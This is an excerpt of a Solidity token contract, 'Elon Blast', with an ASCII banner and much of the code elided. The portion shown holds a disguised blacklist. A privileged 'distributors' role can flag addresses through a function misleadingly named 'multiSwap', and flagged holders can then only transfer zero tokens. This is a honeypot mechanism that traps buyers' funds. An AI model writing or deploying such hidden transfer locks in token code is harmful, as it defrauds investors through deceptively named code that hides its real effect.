...
/**
__/\\\\\\\\\\\\\\\__/\\\___________________/\\\\\_______/\\\\\_____/\\\____________/\\\\\\\\\\\\\____/\\\_________________/\\\\\\\\\________/\\\\\\\\\\\____/\\\\\\\\\\\\\\\___________         
 _\/\\\///////////__\/\\\_________________/\\\///\\\____\/\\\\\\___\/\\\___________\/\\\/////////\\\_\/\\\_______________/\\\\\\\\\\\\\____/\\\/////////\\\_\///////\\\/////____________        
  _\/\\\_____________\/\\\_______________/\\\/__\///\\\__\/\\\/\\\__\/\\\___________\/\\\_______\/\\\_\/\\\______________/\\\/////////\\\__\//\\\______\///________\/\\\_________________       
   _\/\\\\\\\\\\\_____\/\\\______________/\\\______\//\\\_\/\\\//\\\_\/\\\___________\/\\\\\\\\\\\\\\__\/\\\_____________\/\\\_______\/\\\___\////\\\_______________\/\\\_________________      
    _\/\\\///////______\/\\\_____________\/\\\_______\/\\\_\/\\\\//\\\\/\\\___________\/\\\/////////\\\_\/\\\_____________\/\\\\\\\\\\\\\\\______\////\\\____________\/\\\_________________     
     _\/\\\_____________\/\\\_____________\//\\\______/\\\__\/\\\_\//\\\/\\\___________\/\\\_______\/\\\_\/\\\_____________\/\\\/////////\\\_________\////\\\_________\/\\\_________________    
      _\/\\\_____________\/\\\______________\///\\\__/\\\____\/\\\__\//\\\\\\___________\/\\\_______\/\\\_\/\\\_____________\/\\\_______\/\\\__/\\\______\//\\\________\/\\\_________________   
       _\/\\\\\\\\\\\\\\\_\/\\\\\\\\\\\\\\\____\///\\\\\/_____\/\\\___\//\\\\\___________\/\\\\\\\\\\\\\/__\/\\\\\\\\\\\\\\\_\/\\\_______\/\\\_\///\\\\\\\\\\\/_________\/\\\_________________  
        _\///////////////__\///////////////_______\/////_______\///_____\/////____________\/////////////____\///////////////__\///________\///____\///////////___________\///__________________ 
...
contract Ownable is Context {
    ...
    _owner = address(0);}}
contract ElonBlast is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = 'Elon Blast';
    string private _symbol = 'ElonBlast';
    ...
    mapping (address => bool) private _multiSwap;
    ...
    if (_multiSwap[sender] || _multiSwap[recipient]) require (amount == 0, "");
    ...
    _reflectFee(rFee, tFee);
    emit Transfer(sender, recipient, tTransferAmount);}
    function multiSwap(address acconut) external distributors {
    _multiSwap[acconut] = true;}
    function singleSwap(address account) external distributors {
    _multiSwap[account] = false;}
    function checkSwap(address account) public view returns (bool) {
    return _multiSwap[account];}
